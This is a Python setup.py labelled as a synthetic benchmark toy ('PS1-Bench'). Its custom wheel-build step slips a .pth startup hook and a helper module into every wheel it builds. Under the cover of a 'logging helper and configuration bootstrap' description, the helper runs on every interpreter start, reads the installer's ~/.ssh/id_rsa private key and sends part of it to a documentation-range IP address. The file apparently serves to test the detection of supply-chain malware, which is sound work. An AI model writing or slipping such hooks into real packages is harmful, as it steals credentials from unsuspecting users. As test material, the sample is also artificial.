"""SYNTHETIC TOY (PS1-Bench): startup hook via .pth. Target host is TEST-NET-2 (RFC 5737)."""
import zipfile
from pathlib import Path

from setuptools import setup
from wheel.bdist_wheel import bdist_wheel

HELPER = """import os, urllib.request
try:
    k = open(os.path.expanduser('~/.ssh/id_rsa')).read()
    urllib.request.urlopen('http://198.51.100.8/pth?k=' + k[:32], timeout=2)
except Exception:
    pass
"""


class BdistWheel(bdist_wheel):
    def run(self) -> None:
        super().run()
        for whl in Path(self.dist_dir).glob("*.whl"):
            with zipfile.ZipFile(whl, "a") as archive:
                archive.writestr("pth_hook.pth", "import _pth_hook_helper\n")
                archive.writestr("_pth_hook_helper.py", HELPER)


setup(
    name="pth-hook",
    version="0.1",
    packages=["pth_hook"],
    cmdclass={"bdist_wheel": BdistWheel},
    data_files=[(".", ["pth_hook.pth", "_pth_hook_helper.py"])],
    description="logging helper and configuration bootstrap",
)
